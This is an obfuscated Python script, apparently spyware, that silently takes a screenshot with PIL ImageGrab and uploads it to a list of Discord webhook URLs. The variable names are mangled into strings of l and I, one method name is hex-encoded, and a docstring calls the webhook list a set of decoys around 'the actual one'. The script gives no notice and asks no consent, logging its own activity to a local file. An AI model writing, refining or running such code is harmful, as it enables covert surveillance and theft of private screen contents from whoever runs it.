lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII = getattr, bytes, __name__, Exception

from logging import DEBUG as lllIIIlIllIlII, basicConfig as IIlIIllIIlIlll, error as lIllIlIIllIIll, info as llIIlIIlIlIIII
from io import BytesIO as IllllIlIIllIll
from requests import post as lllIlllIIlIIII
from requests.exceptions import HTTPError as lIIlIlllIlIlIl
from PIL import ImageGrab as llllIllIIllIIl
from pathlib import Path as IlIlIIIIlIllll
IIIIlIIIIIIlIlllIl = IlIlIIIIlIllll(__file__).parent / 'bbgg.log'
IIlIIllIIlIlll(filename=IIIIlIIIIIIlIlllIl, level=lllIIIlIllIlII, format='%(asctime)s - %(levelname)s - %(message)s')

def lIIIlIlIIIlllIlIll():
    """Returns a list of webhook URLs, including the actual one."""
    return ['https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnoPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz', 'https://discord.com/api/webhooks/234567890123456789/abcdefghijklmnopQRSTuvwxyZ0123456789abcdefghi', 'https://discord.com/api/webhooks/345678901234567890/bcdefghijklmnopQRstuvwxyzABCDEFGHIJKLMN0123456789', 'https://discord.com/api/webhooks/456789012345678901/cdefghijklmnopqrstuvwxyzABCD1234567890efghijklmn', 'https://discord.com/api/webhooks/567890123456789012/uvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdef']

def llIIllIlllIIIllIIl():
    """Capture a screenshot and send it to all webhook URLs with detailed logging."""
    llIllllllIlIIIIIIl = lIIIlIlIIIlllIlIll()
    try:
        IllIIllIIIlIIlIllI = llllIllIIllIIl.grab()
        with IllllIlIIllIll() as IIlllIIlIIlllIlIll:
            IllIIllIIIlIIlIllI.save(IIlllIIlIIlllIlIll, format='PNG')
            lllllllllllllll(IIlllIIlIIlllIlIll, lllllllllllllll(llllllllllllllI, 'fromhex')('7365656b').decode())(0)
            lllIlllIlIlIlIIIlI = {'file': ('screenshot.png', IIlllIIlIIlllIlIll, 'image/png')}
            for IIIlIIIlIlllIlIIlI in llIllllllIlIIIIIIl:
                try:
                    IlIlIlllllllIIIllI = lllIlllIIlIIII(IIIlIIIlIlllIlIIlI, files=lllIlllIlIlIlIIIlI)
                    IlIlIlllllllIIIllI.raise_for_status()
                    llIIlIIlIlIIII(f'Screenshot successfully sent to {IIIlIIIlIlllIlIIlI}.')
                except lIIlIlllIlIlIl as llllllIIllllIlIIII:
                    lIllIlIIllIIll(f'HTTP error occurred when sending to {IIIlIIIlIlllIlIIlI}: {llllllIIllllIlIIII}')
                except lllllllllllllII as IIlIIIllIIllllllIl:
                    lIllIlIIllIIll(f'An error occurred when sending to {IIIlIIIlIlllIlIIlI}: {IIlIIIllIIllllllIl}')
    except lllllllllllllII as IIlIIIllIIllllllIl:
        lIllIlIIllIIll(f'An error occurred during screenshot capture: {IIlIIIllIIllllllIl}')
if lllllllllllllIl == '__main__':
    llIIllIlllIIIllIIl()